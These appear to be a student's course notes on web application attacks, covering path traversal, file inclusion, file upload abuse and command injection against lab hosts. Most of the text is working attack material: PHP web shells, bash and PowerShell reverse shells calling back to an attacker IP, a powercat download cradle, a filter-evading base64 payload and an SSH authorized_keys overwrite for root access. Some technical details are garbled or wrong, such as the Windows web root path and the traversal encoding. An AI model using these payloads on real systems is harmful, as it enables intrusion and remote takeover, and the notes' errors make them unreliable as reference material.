Traversal attacks

../ to move back and given all webapps are just getting a file in a directory of the server we can abuse this to access root from web root

web root in linux are usually at: /var/www/html/

an exmaple attack: http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
9../

this traverse from the web root to etc/passwd where all user files are kept

we can then access the ssh private key of users from

/home/username/.ssh/id_rsa

remember to chmod 400 private_key otherwise ssh is going to complain

ssh -i dt_key -p 2222 offsec@mountaindesserts.com

ssh command to connect via port 2222 using a private key file instead of passcode

on windows web root is at C:\Windows\System32\druvers\etc\hosts
note that ../ and ..\ on windows

more varied log location in windows need to read documentation of each server provider


ASCII encoding: 

sometimes web app detects characters such as .. to prevent traversal attacks

encode with ASCII: ../ == 2%e2%e/

File Inclusion Vulnerabilites

Local Files Inclusion and Log poisoning

by changing the user-agent in a get request to

<?php echo system($_GET['cmd']); ?> (php command for a shell)

we trigger the payload by accessing the access.log with

curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log

we can access the cmd via http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=<command>

space works different in url so need to encode with ASCII to %20

bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1" 
php command for forcing a reverse bash shell as php don't default on bash

bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
URL encoded version

listen with nc -nvlp 4444


PHP Wrappers

php://filter wrapper to display contents of files with or without encoding 

we can display .php files instead of exeing them with php://filter as well

with command like:
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
could be same as without php://filter

curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
using base64 encode to view admin.php content so that the LFI vulnerability doesn't just exe the code instead of showing it

decoding: echo "<content>" | base64 -d

data://for code execution, for plaintext or base64-encoding
alternative to when poisoning of local file with php fails


curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
this run ls

web app and firewalls filters for strings like windows AV deleteing this file

we can encode with base 64:
echo -n '<?php echo system($_GET["cmd"]);?>' | basse64

and run with:
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"

this gets around AV by hiding the php cmd shell comman


Remote FIle inclusion

not as common as  LFI, for php server allow_url_include needs to bee on different server may vary

data:// wrapper also needs allow_url_include

include friles from a remote system over HTTP or SMB

kali has a bunch of php payloads at /usr/share/webshells/php

to use the webshell we need to create a reverse reverse shell

python3 -m http.server 80 
this opens a http server on port 80 with pyhton

using curl:
curl "http://<domain>/meteor/index.php?page=http://<myip>/simple-backdoor.php&cmd=<command>"

when using the ptentestmnokey's php reverse shell remember to change the ip to my vpn ip, this shell actually give me a proper bash console default port is 4444


File upload vulnerabilies

exe files:
depending on web app and use, we can make educated guesses to locate upload mechanisms

conntent management system, often upload avatar

ect

just upload like the nibbles box

if php is blocked we ecan rename the files extention to phps or php7 

or we can change chatacters in the file extension to upper case

.php to .pHP


powershell one-liner for reverse shell

encode with base64

pwsh
to run powershell in kali

$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.164",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

$EncodedText =[Convert]::ToBase64String($Bytes)

$EncodedText

exit

variable $Text used to store the reversehll logic
convert and the property Unicode from the class Encoding to encde content of Text Var

and then we can use the vuln explored before with 
&cmd=powershell%20-enc%20<command base64>
-enc used to decode the encoded code from the powershell op


Using non executable files

something like google drive

when testing file uplaod form, determine what happens when the same files is uploaded multiple time, app indicates files exists we can use brute force to get the content of server, error message is helpful as  well


POST request in BURP for uploading file

we can mod the file name for directory traversal in burp: 
../../../../../../../test.txt

Apache Nginx or other dedicated web server run with specific users such as www-data on linux.

windows IIS webserver runs as a network service account, passwordless buildin windows id with low privileges

when using programming languages that include their own webserver, admins often deply web app without any privilege structures by running at root or admin ro avoid permission, always verify whe we can use

overwrite authorized_keys in home firectory of root

ssh-keygen
generate ssh key pair

cat fileup.pub > authorized_keys
rename fileup.pub to authorized keys

we can upload with ../../../../../../../root/.ssh/authorized_keys
rename is done in burp intercept

rm ~/.ssh/known_hosts 
to remove saved hosts files because we're going to test a different machine
ssh -p <port> -i <privatekey file> root@domain


OS command injection

ExploitDB

we can use burp to inspect the actual command and modify it with repeater

curl -X POST --data 'Archive=<command>' <domain>/archive
this is obtained from burp or just inspecting the input feild

we can use %3B for encoded ;
or && 

(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell

CMD depending on where it is executed

curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive

encoded version 

power cat for reverse shell netcat for windows

cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
this copy powercat to home directory of user

we can then start python3 webserver on the same directory

need to also start netcat listener

IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
powershell download cradle to load powercat function in powercat from our server. second command to create reverse shell with -c of where to connect -p for port and -e for the program

curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
encoded curl version

normal netcat can just
nc <ip> <port> -e /bin/bash for reverse shell